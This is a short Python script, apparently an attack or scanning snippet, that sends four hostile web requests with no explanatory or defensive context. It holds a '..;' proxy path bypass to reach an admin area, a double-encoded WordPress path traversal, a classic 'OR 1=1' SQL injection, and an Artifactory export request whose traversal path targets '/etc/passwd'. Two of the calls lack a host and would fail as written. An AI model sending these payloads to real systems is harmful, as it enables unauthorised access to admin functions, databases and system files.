import requests

proxy_path = "/public/..;/admin"
wordpress_url = "https://target.invalid/?pagename=one%252e%252e%252f%252e%252e%252fwp-content"
sqli_url = "https://target.invalid/item?id=1 OR 1=1"
artifactory_route = "/ui/stashResults/export"
artifactory_request = {"repoKey": "libs-release-local", "relativePath": "../../webapps/ROOT/../../etc/passwd"}
requests.get(proxy_path)
requests.get(wordpress_url)
requests.get(sqli_url)
requests.get(artifactory_route, params=artifactory_request)
